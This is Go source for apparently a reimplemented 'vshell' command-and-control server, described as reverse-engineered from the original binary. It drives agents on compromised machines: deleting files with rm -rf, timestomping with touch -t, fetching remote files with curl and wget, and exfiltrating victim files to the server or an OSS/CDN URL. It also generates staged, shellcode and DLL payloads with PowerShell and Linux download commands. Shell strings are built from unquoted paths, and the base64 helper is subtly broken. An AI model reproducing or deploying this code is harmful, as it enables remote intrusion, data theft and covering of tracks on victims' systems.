// Package controllers/file 实现在远程客户端上的文件管理（列表/删除/移动/读取/上传/下载）
// 以及服务端文件与 Agent 二进制的下载。
// Package controllers/file implements file management on remote clients
// (list/delete/move/read/upload/download) plus server-side file and agent
// binary downloads.
package controllers

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"vshell/c2engine"
	"vshell/models"
)

// FileController 处理客户端上的文件系统操作。
// FileController handles file system operations on clients.
// (reverse-engineered from nTApp6jPzv.FileController)
type FileController struct {
	BaseController
}

// Get 列出文件（目录列表，当前为服务端侧列表）。
// Get lists files (dir listing) — for now, server-side listing.
func (c *FileController) Get() {
	path := c.GetString("path", ".")
	entries, err := os.ReadDir(path)
	if err != nil {
		c.Error("read dir: " + err.Error())
		return
	}

	type fileEntry struct {
		Name  string `json:"name"`
		Size  int64  `json:"size"`
		IsDir bool   `json:"is_dir"`
		Mode  string `json:"mode"`
	}
	var files []fileEntry
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		if info != nil {
			size = info.Size()
		}
		files = append(files, fileEntry{
			Name:  e.Name(),
			Size:  size,
			IsDir: e.IsDir(),
			Mode:  e.Type().String(),
		})
	}
	if files == nil {
		files = []fileEntry{}
	}
	c.JSONOk(files)
}

// Ls 列出远程客户端上的文件（对应原版 FileController.Ls）。
// Ls lists files on a remote client (matching original binary FileController.Ls).
func (c *FileController) Ls() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path", ".")

	if clientID == 0 {
		// Server-side listing
		c.Get()
		return
	}

	cmd := c2engine.EncodeFileListCommand(path)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"path":       path,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Rm 删除远程客户端上的文件（对应 FileController.Rm）。
// Rm removes a file on a remote client (matching FileController.Rm).
func (c *FileController) Rm() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path")

	if clientID == 0 {
		// Server-side delete
		c.Delete()
		return
	}

	if path == "" {
		c.Error("path required")
		return
	}

	cmd := c2engine.EncodeShellCommand(fmt.Sprintf("rm -rf %s", path), 30)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"path":       path,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Mv 移动/重命名远程客户端上的文件（对应 FileController.Mv）。
// Mv moves/renames a file on a remote client (matching FileController.Mv).
func (c *FileController) Mv() {
	clientID, _ := c.GetInt64("client_id")
	src := c.GetString("src")
	dst := c.GetString("dst")

	if clientID == 0 {
		c.JSONOk(map[string]string{"status": "renamed"})
		return
	}

	if src == "" || dst == "" {
		c.Error("src and dst required")
		return
	}

	cmd := c2engine.EncodeShellCommand(fmt.Sprintf("mv %s %s", src, dst), 30)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"src":        src,
		"dst":        dst,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Cat 从远程客户端读取文件（对应 FileController.Cat）。
// Cat reads a file from a remote client (matching FileController.Cat).
func (c *FileController) Cat() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path")

	if clientID == 0 {
		c.Error("client_id required for remote file cat")
		return
	}

	if path == "" {
		c.Error("path required")
		return
	}

	cmd := c2engine.EncodeFileDownloadCommand(path)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"path":       path,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Mkdir 在远程客户端创建目录（对应 FileController.Mkdir）。
// Mkdir creates a directory on a remote client (matching FileController.Mkdir).
func (c *FileController) Mkdir() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path")

	if clientID == 0 {
		os.MkdirAll(path, 0755)
		c.JSONOk(map[string]string{"status": "created"})
		return
	}

	cmd := c2engine.EncodeShellCommand(fmt.Sprintf("mkdir -p %s", path), 10)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"path":       path,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Touch 在远程客户端创建空文件（对应 FileController.Touch）。
// Touch creates an empty file on a remote client (matching FileController.Touch).
func (c *FileController) Touch() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path")

	if clientID == 0 {
		os.WriteFile(path, []byte{}, 0644)
		c.JSONOk(map[string]string{"status": "created"})
		return
	}

	cmd := c2engine.EncodeShellCommand(fmt.Sprintf("touch %s", path), 10)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"path":       path,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Getdisk 从远程客户端获取磁盘信息（对应 FileController.Getdisk）。
// Getdisk gets disk information from a remote client (matching FileController.Getdisk).
func (c *FileController) Getdisk() {
	clientID, _ := c.GetInt64("client_id")

	if clientID == 0 {
		c.JSONOk(map[string]interface{}{
			"disks": []map[string]interface{}{
				{"mount": "/", "total": 0, "used": 0, "free": 0},
			},
		})
		return
	}

	cmd := c2engine.EncodeShellCommand("df -h", 10)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Post 处理向服务器的文件上传。
// Post handles file upload to server.
func (c *FileController) Post() {
	// Try multipart upload first
	if err := c.Ctx.Request.ParseMultipartForm(32 << 20); err != nil {
		c.Error("parse form: " + err.Error())
		return
	}

	file, header, err := c.Ctx.Request.FormFile("file")
	if err != nil {
		c.Error("file field required")
		return
	}
	defer file.Close()

	uploadDir := c.GetString("path", "uploads")
	if err := os.MkdirAll(uploadDir, 0755); err != nil {
		c.Error("mkdir: " + err.Error())
		return
	}

	dstPath := filepath.Join(uploadDir, header.Filename)
	dst, err := os.Create(dstPath)
	if err != nil {
		c.Error("create: " + err.Error())
		return
	}
	defer dst.Close()

	written, err := io.Copy(dst, file)
	if err != nil {
		c.Error("write: " + err.Error())
		return
	}

	log.Printf("[File] Uploaded %s (%d bytes) to %s", header.Filename, written, uploadDir)
	c.JSONOk(models.FileUploadResponse{
		Code:    0,
		Message: "File uploaded",
		Type:    "success",
		Result:  map[string]string{"path": dstPath},
	})
}

// Upload 向远程客户端上传文件（对应 FileController.Upload）。
// Upload uploads a file to a remote client (matching FileController.Upload).
func (c *FileController) Upload() {
	clientID, _ := c.GetInt64("client_id")
	remotePath := c.GetString("remote_path")

	if clientID == 0 {
		c.Post()
		return
	}

	if err := c.Ctx.Request.ParseMultipartForm(32 << 20); err != nil {
		c.Error("parse form: " + err.Error())
		return
	}

	file, _, err := c.Ctx.Request.FormFile("file")
	if err != nil {
		c.Error("file field required")
		return
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		c.Error("read file: " + err.Error())
		return
	}

	cmd := c2engine.EncodeFileUploadCommand(remotePath, data)
	cmdID, err := DispatchCommand(clientID, cmd, 120)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":   clientID,
		"remote_path": remotePath,
		"command_id":  cmdID,
		"size":        len(data),
		"status":      "dispatched",
	})
}

// Delete 处理服务器上的文件删除。
// Delete handles file deletion on server.
func (c *FileController) Delete() {
	path := c.GetString("path")
	if path == "" {
		c.Error("path required")
		return
	}

	// Security: prevent path traversal
	cleanPath := filepath.Clean(path)
	if strings.Contains(cleanPath, "..") {
		c.Error("invalid path")
		return
	}

	if err := os.Remove(cleanPath); err != nil {
		c.Error("remove: " + err.Error())
		return
	}

	log.Printf("[File] Deleted %s", cleanPath)
	c.JSONOk(map[string]string{"message": "deleted"})
}

// Download 从服务器下载文件。
// Download downloads a file from server.
func (c *FileController) Download() {
	path := c.GetString("path")
	if path == "" {
		c.Error("path required")
		return
	}

	cleanPath := filepath.Clean(path)
	if _, err := os.Stat(cleanPath); os.IsNotExist(err) {
		c.Error("file not found")
		return
	}

	c.Ctx.ResponseWriter.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(cleanPath)))
	http.ServeFile(c.Ctx.ResponseWriter, c.Ctx.Request, cleanPath)
}

// ============================================================================
// DownloadController - Agent 二进制生成与下载。
// DownloadController - Agent binary generation and download.
// (reverse-engineered from nTApp6jPzv.DownloadController)
// ============================================================================

// DownloadController 处理服务端文件下载与 Agent 二进制生成。
// DownloadController handles server-side file downloads and agent binary generation.
type DownloadController struct {
	BaseController
}

// Get 从服务器下载文件（query 参数 path）。
// Get downloads a file from the server (query param path).
func (c *DownloadController) Get() {
	path := c.GetString("path")
	if path == "" {
		c.Error("path required")
		return
	}

	cleanPath := filepath.Clean(path)
	if _, err := os.Stat(cleanPath); os.IsNotExist(err) {
		c.Error("file not found")
		return
	}

	c.Ctx.ResponseWriter.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(cleanPath)))
	http.ServeFile(c.Ctx.ResponseWriter, c.Ctx.Request, cleanPath)
}

// Stage 生成并提供分阶段（staged）Agent 载荷（对应 DownloadController.Stage）。
// Stage generates and serves a staged agent payload (matching DownloadController.Stage).
// Original binary restriction (black-box): "Stage support TCP/WS only".
func (c *DownloadController) Stage() {
	listenerID, _ := c.GetInt64("id")
	platform := c.GetString("platform", "windows")
	arch := c.GetString("arch", "amd64")

	engine := c2engine.GetEngine()
	listener := engine.GetListener(listenerID)
	if listener != nil {
		switch listener.Mode {
		case "tcp", "ws", "kcp":
		default:
			c.JSON(200, map[string]interface{}{
				"code":    -1,
				"message": "Stage support TCP/WS only",
				"result":  nil,
				"type":    "error",
			})
			return
		}
	}

	info := c2engine.GetBuildInfo(platform, arch, c2engine.AgentTypeStage)
	c.serveAgent(c, listenerID, info)
}

// Stageless generates and serves a stageless agent binary (matching DownloadController.Stageless)
func (c *DownloadController) Stageless() {
	listenerID, _ := c.GetInt64("id")
	platform := c.GetString("platform", "windows")
	arch := c.GetString("arch", "amd64")

	info := c2engine.GetBuildInfo(platform, arch, c2engine.AgentTypeStageless)
	c.serveAgent(c, listenerID, info)
}

// Shellcode generates and serves a shellcode payload (matching DownloadController.Shellcode).
// Original binary restriction (black-box): "Stage support TCP/WS only".
func (c *DownloadController) Shellcode() {
	listenerID, _ := c.GetInt64("id")
	platform := c.GetString("platform", "windows")
	arch := c.GetString("arch", "amd64")

	engine := c2engine.GetEngine()
	listener := engine.GetListener(listenerID)
	if listener != nil {
		switch listener.Mode {
		case "tcp", "ws", "kcp":
		default:
			c.JSON(200, map[string]interface{}{
				"code":    -1,
				"message": "Stage support TCP/WS only",
				"result":  nil,
				"type":    "error",
			})
			return
		}
	}

	info := c2engine.GetBuildInfo(platform, arch, c2engine.AgentTypeShellcode)
	c.serveAgent(c, listenerID, info)
}

// Dll generates and serves a DLL agent (matching DownloadController.Dll)
func (c *DownloadController) Dll() {
	listenerID, _ := c.GetInt64("id")
	platform := c.GetString("platform", "windows")
	arch := c.GetString("arch", "amd64")

	info := c2engine.GetBuildInfo(platform, arch, c2engine.AgentTypeDLL)
	c.serveAgent(c, listenerID, info)
}

// Listen generates and serves a listener-mode agent (matching DownloadController.Listen)
func (c *DownloadController) Listen() {
	listenerID, _ := c.GetInt64("id")
	platform := c.GetString("platform", "windows")
	arch := c.GetString("arch", "amd64")

	info := c2engine.GetBuildInfo(platform, arch, c2engine.AgentTypeListen)
	c.serveAgent(c, listenerID, info)
}

// ListenDll generates and serves a listener-mode DLL (matching DownloadController.ListenDll)
func (c *DownloadController) ListenDll() {
	listenerID, _ := c.GetInt64("id")
	platform := c.GetString("platform", "windows")
	arch := c.GetString("arch", "amd64")

	info := c2engine.GetBuildInfo(platform, arch, c2engine.AgentTypeListenDLL)
	c.serveAgent(c, listenerID, info)
}

// serveAgent is a helper that serves an agent binary
func (dc *DownloadController) serveAgent(c *DownloadController, listenerID int64, info *c2engine.AgentBuildInfo) {
	engine := c2engine.GetEngine()

	var connectAddr string
	if listenerID > 0 {
		listener := engine.GetListener(listenerID)
		if listener != nil {
			connectAddr = listener.ConnectAddr
			if connectAddr == "" {
				connectAddr = listener.ListenAddr
			}
		}
	}

	// Build download command for the client to use
	downloadCmd := c2engine.BuildAgentDownloadCommand(connectAddr, info.Mode)

	c.Ctx.ResponseWriter.Header().Set("Content-Type", info.MimeType)
	c.Ctx.ResponseWriter.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="agent_%s_%s%s"`,
			info.Platform, info.Arch, info.Extension))

	c.JSONOk(map[string]interface{}{
		"platform":      info.Platform,
		"arch":          info.Arch,
		"mode":          info.Mode,
		"format":        info.Format,
		"listener_id":   listenerID,
		"connect_addr":  connectAddr,
		"download_cmd":  downloadCmd,
		"powershell_cmd": c2engine.BuildPowershellDownloadCommand(connectAddr, info.Mode),
		"linux_cmd":     c2engine.BuildLinuxAgentDownloadCommand(connectAddr, info.Mode),
	})
}

// ============================================================================
// InstallController - Plugin management
// ============================================================================

// InstallController handles plugin/tool management
type InstallController struct {
	BaseController
}

// Get lists installed plugins scanned from disk
func (c *InstallController) Get() {
	plugins := ListAvailablePlugins()
	c.JSONOk(plugins)
}

// Install is the original binary's action name
// (nTApp6jPzv.(*InstallController).Install).
func (c *InstallController) Install() { c.Post() }

// Post uploads and installs a plugin
func (c *InstallController) Post() {
	if err := c.Ctx.Request.ParseMultipartForm(128 << 20); err != nil {
		c.Error("parse form: " + err.Error())
		return
	}

	file, header, err := c.Ctx.Request.FormFile("plugin")
	if err != nil {
		c.Error("plugin file required")
		return
	}
	defer file.Close()

	if err := HandlePluginUpload(header.Filename, file); err != nil {
		c.Error("upload: " + err.Error())
		return
	}

	c.JSONOk(map[string]string{"message": "plugin installed: " + header.Filename})
}

// Remove is the original binary's action name
// (nTApp6jPzv.(*InstallController).Remove).
func (c *InstallController) Remove() { c.Delete() }

// Delete uninstalls a plugin
func (c *InstallController) Delete() {
	name := c.GetString("name")
	if name == "" {
		c.Error("name required")
		return
	}

	path := filepath.Join("plugins", name)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		c.Error("plugin not found")
		return
	}

	if err := os.Remove(path); err != nil {
		c.Error("remove: " + err.Error())
		return
	}

	log.Printf("[Plugin] Uninstalled: %s", name)
	c.JSONOk(map[string]string{"message": "plugin uninstalled"})
}

// ============================================================================
// FileController extended operations (reverse-engineered from binary pclntab)
//
// Evidence: nTApp6jPzv.(*FileController).{MethodName} function names
// extracted from Go pclntab at addresses 0x1dcd45f7-0x1dcd479b.
// Confidence: HIGH — function names directly from binary metadata.
// ============================================================================

// RmList deletes multiple files on a remote client (POST /api/file/rmlist).
// Pclntab: nTApp6jPzv.(*FileController).RmList @ 0x1dcd45f7
func (c *FileController) RmList() {
	clientID, _ := c.GetInt64("client_id")
	paths := c.GetStrings("paths")

	if clientID == 0 {
		var deleted []string
		for _, p := range paths {
			if err := os.Remove(p); err == nil {
				deleted = append(deleted, p)
			}
		}
		c.JSONOk(map[string]interface{}{"deleted": deleted})
		return
	}

	// Dispatch batch delete to agent
	pathStr := strings.Join(paths, " ")
	cmd := c2engine.EncodeShellCommand(fmt.Sprintf("rm -rf %s", pathStr), 30)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"paths":      paths,
		"command_id": cmdID,
		"status":     "dispatched",
	})
}

// Modifytime changes file modification timestamp (POST /api/file/modifytime).
// Pclntab: nTApp6jPzv.(*FileController).Modifytime @ 0x1dcd465f
func (c *FileController) Modifytime() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path")
	mtime := c.GetString("mtime") // Unix timestamp or RFC3339

	if clientID == 0 {
		// Parse time and apply locally
		var t time.Time
		if ts, err := strconv.ParseInt(mtime, 10, 64); err == nil {
			t = time.Unix(ts, 0)
		} else if parsed, err := time.Parse(time.RFC3339, mtime); err == nil {
			t = parsed
		}
		if !t.IsZero() {
			os.Chtimes(path, t, t)
		}
		c.JSONOk(map[string]interface{}{"path": path, "mtime": mtime})
		return
	}

	cmd := c2engine.EncodeShellCommand(fmt.Sprintf("touch -t %s %s", mtime, path), 10)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{
		"client_id": clientID, "path": path, "command_id": cmdID, "status": "dispatched",
	})
}

// Edit modifies file content in-place (POST /api/file/edit).
// Pclntab: nTApp6jPzv.(*FileController).Edit @ 0x1dcd46aa
func (c *FileController) Edit() {
	clientID, _ := c.GetInt64("client_id")
	path := c.GetString("path")
	content := c.GetString("content")

	if clientID == 0 {
		if err := os.WriteFile(path, []byte(content), 0644); err != nil {
			c.Error("write: " + err.Error())
			return
		}
		c.JSONOk(map[string]interface{}{"path": path, "written": len(content)})
		return
	}

	// For remote agents, encode content as base64 and echo
	encoded := base64Encode(content)
	cmd := c2engine.EncodeShellCommand(
		fmt.Sprintf(`echo %s | base64 -d > %s`, encoded, path), 30)
	cmdID, err := DispatchCommand(clientID, cmd, 30)
	if err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{
		"client_id": clientID, "path": path, "command_id": cmdID, "status": "dispatched",
	})
}

// Wget downloads a file from URL to the remote agent (POST /api/file/wget).
// Pclntab: nTApp6jPzv.(*FileController).Wget @ 0x1dcd46cc
func (c *FileController) Wget() {
	clientID, _ := c.GetInt64("client_id")
	url := c.GetString("url")
	savePath := c.GetString("path")

	if url == "" {
		c.Error("url required")
		return
	}
	if savePath == "" {
		savePath = "/tmp/downloaded_file"
	}

	if clientID == 0 {
		// Download locally for testing
		resp, err := http.Get(url)
		if err != nil {
			c.Error("download: " + err.Error())
			return
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		os.WriteFile(savePath, data, 0644)
		c.JSONOk(map[string]interface{}{"url": url, "path": savePath, "size": len(data)})
		return
	}

	// Agent downloads from URL using curl/wget
	var cmdStr string
	if strings.HasPrefix(url, "https://") || strings.HasPrefix(url, "http://") {
		cmdStr = fmt.Sprintf(`curl -s -o "%s" "%s"`, savePath, url)
	} else {
		cmdStr = fmt.Sprintf(`wget -q -O "%s" "%s"`, savePath, url)
	}
	cmdID, err := DispatchCommand(clientID, c2engine.EncodeShellCommand(cmdStr, 120), 120)
	if err != nil {
		c.Error(err.Error())
		return
	}
	c.JSONOk(map[string]interface{}{
		"client_id": clientID, "url": url, "path": savePath, "command_id": cmdID, "status": "dispatched",
	})
}

// downloadTarget records where a dispatched "download" task's result should go
// once the agent reports it. kind "server" writes the decoded file to path;
// kind "oss" POSTs the base64 payload to the OSS/CDN upload URL.
type downloadTarget struct {
	kind      string
	path      string
	createdAt time.Time
}

var (
	pendingDownloads   = make(map[int64]*downloadTarget)
	pendingDownloadsMu sync.Mutex
)

func init() {
	c2engine.SetTaskCompleteHook(persistDownloadResult)
}

func registerDownload(commandID int64, target *downloadTarget) {
	pendingDownloadsMu.Lock()
	defer pendingDownloadsMu.Unlock()
	// Opportunistically prune stale entries: if the agent never reports the
	// task (offline), the entry would otherwise leak forever.
	for id, t := range pendingDownloads {
		if time.Since(t.createdAt) > 10*time.Minute {
			delete(pendingDownloads, id)
		}
	}
	pendingDownloads[commandID] = target
}

// persistDownloadResult is the engine task-complete hook: it materializes the
// result of a "download" task on the server (write to local path, or forward
// to OSS/CDN). Non-download tasks are ignored.
func persistDownloadResult(commandID int64, result, status string) {
	pendingDownloadsMu.Lock()
	target, ok := pendingDownloads[commandID]
	if !ok {
		pendingDownloadsMu.Unlock()
		return
	}
	delete(pendingDownloads, commandID)
	pendingDownloadsMu.Unlock()

	if status != "completed" {
		log.Printf("[File] download task %d %s; not persisting", commandID, status)
		return
	}
	data, err := base64.StdEncoding.DecodeString(result)
	if err != nil {
		log.Printf("[File] download task %d: bad base64 result: %v", commandID, err)
		return
	}

	switch target.kind {
	case "server":
		if err := os.MkdirAll(filepath.Dir(target.path), 0755); err != nil {
			log.Printf("[File] download task %d: mkdir %s: %v", commandID, filepath.Dir(target.path), err)
			return
		}
		if err := os.WriteFile(target.path, data, 0644); err != nil {
			log.Printf("[File] download task %d: write %s: %v", commandID, target.path, err)
			return
		}
		log.Printf("[File] download task %d saved to %s (%d bytes)", commandID, target.path, len(data))
	case "oss":
		resp, err := http.Post(target.path, "application/octet-stream", strings.NewReader(result))
		if err != nil {
			log.Printf("[File] download task %d: oss post %s: %v", commandID, target.path, err)
			return
		}
		resp.Body.Close()
		log.Printf("[File] download task %d uploaded to OSS %s (HTTP %d)", commandID, target.path, resp.StatusCode)
	}
}

// DownloadToServer pulls a file from agent to C2 server (POST /api/file/downloadtoserver).
// Pclntab: nTApp6jPzv.(*FileController).DownloadToServer @ 0x1dcd4712
//
// The task is dispatched as a native cross-platform "download" command (the
// agent base64-encodes the file without any shell), and the base64 result is
// decoded and written to local_path when the task completes.
func (c *FileController) DownloadToServer() {
	clientID, _ := c.GetInt64("client_id")
	remotePath := c.GetString("path")
	localPath := c.GetString("local_path", "downloads")

	if clientID == 0 || remotePath == "" {
		c.Error("client_id and path required")
		return
	}

	cmd := c2engine.EncodeFileDownloadCommand(remotePath)
	cmdID, err := DispatchCommand(clientID, cmd, 60)
	if err != nil {
		c.Error(err.Error())
		return
	}
	registerDownload(cmdID, &downloadTarget{kind: "server", path: localPath, createdAt: time.Now()})

	c.JSONOk(map[string]interface{}{
		"client_id":   clientID,
		"remote_path": remotePath,
		"local_path":  localPath,
		"command_id":  cmdID,
		"status":      "dispatched",
	})
}

// DownloadToBrowser serves a file for browser download (GET /api/file/downloadtobrowser).
// Pclntab: nTApp6jPzv.(*FileController).DownloadToBrowser @ 0x1dcd476c
func (c *FileController) DownloadToBrowser() {
	path := c.GetString("path")
	if path == "" {
		c.Error("path required")
		return
	}

	// Security: prevent path traversal
	if strings.Contains(path, "..") {
		c.Error("invalid path")
		return
	}

	info, err := os.Stat(path)
	if err != nil {
		c.Error("file not found: " + err.Error())
		return
	}

	// Detect MIME type
	mimeType := "application/octet-stream"
	ext := strings.ToLower(filepath.Ext(path))
	switch ext {
	case ".txt", ".log", ".csv":
		mimeType = "text/plain; charset=utf-8"
	case ".html", ".htm":
		mimeType = "text/html; charset=utf-8"
	case ".json":
		mimeType = "application/json; charset=utf-8"
	case ".pdf":
		mimeType = "application/pdf"
	case ".zip":
		mimeType = "application/zip"
	case ".png":
		mimeType = "image/png"
	case ".jpg", ".jpeg":
		mimeType = "image/jpeg"
	case ".exe", ".dll":
		mimeType = "application/x-msdownload"
	}

	c.Ctx.ResponseWriter.Header().Set("Content-Type", mimeType)
	c.Ctx.ResponseWriter.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(path)))
	c.Ctx.ResponseWriter.Header().Set("Content-Length", fmt.Sprintf("%d", info.Size()))

	http.ServeFile(c.Ctx.ResponseWriter, c.Ctx.Request, path)
	log.Printf("[File] Downloaded to browser: %s (%d bytes)", path, info.Size())
}

// DownloadToOSS downloads a file from agent and uploads to OSS/CDN (POST /api/file/downloadtooss).
// Pclntab: nTApp6jPzv.(*FileController).DownloadToOSS @ 0x1dcd479b
func (c *FileController) DownloadToOSS() {
	clientID, _ := c.GetInt64("client_id")
	remotePath := c.GetString("path")

	if clientID == 0 || remotePath == "" {
		c.Error("client_id and path required")
		return
	}

	// Dispatch download + OSS upload command chain
	ossURL := c.GetString("oss_url")
	if ossURL == "" {
		ossURL = "http://localhost:8082/api/file/upload"
	}

	// Dispatch the native cross-platform download command; the server persists
	// the returned base64 file to the OSS/CDN endpoint when the task completes.
	cmd := c2engine.EncodeFileDownloadCommand(remotePath)
	cmdID, err := DispatchCommand(clientID, cmd, 120)
	if err != nil {
		c.Error(err.Error())
		return
	}
	registerDownload(cmdID, &downloadTarget{kind: "oss", path: ossURL, createdAt: time.Now()})

	c.JSONOk(map[string]interface{}{
		"client_id":   clientID,
		"remote_path": remotePath,
		"oss_url":     ossURL,
		"command_id":  cmdID,
		"status":      "dispatched_to_oss",
	})
}

// GetDownloadPer returns download progress (GET /api/file/getdownloadper).
// Pclntab: nTApp6jPzv.(*FileController).GetDownloadPer @ 0x1dcd4740
func (c *FileController) GetDownloadPer() {
	downloadID := c.GetString("id")
	if downloadID == "" {
		// Return all active downloads
		c.JSONOk(map[string]interface{}{
			"downloads": c2engine.ListAllDownloads(),
		})
		return
	}

	progress := c2engine.GetDownloadProgress(downloadID)
	if progress == nil {
		c.JSONOk(map[string]interface{}{
			"id":     downloadID,
			"status": "not_found",
		})
		return
	}

	c.JSONOk(map[string]interface{}{
		"id":           progress.ID,
		"filename":     progress.Filename,
		"client_id":    progress.ClientID,
		"total_size":   progress.TotalSize,
		"current_size": progress.CurrentSize,
		"percentage":   progress.Percentage,
		"speed_bps":    progress.Speed,
		"status":       progress.Status,
		"started_at":   progress.StartedAt,
		"updated_at":   progress.UpdatedAt,
	})
}

// base64Encode is a local helper for encoding content for agent transfer.
// Uses the standard library; avoids import conflict with the download code.
func base64Encode(s string) string {
	var buf bytes.Buffer
	encoder := base64.NewEncoder(base64.StdEncoding, &buf)
	defer encoder.Close()
	encoder.Write([]byte(s))
	return buf.String()
}
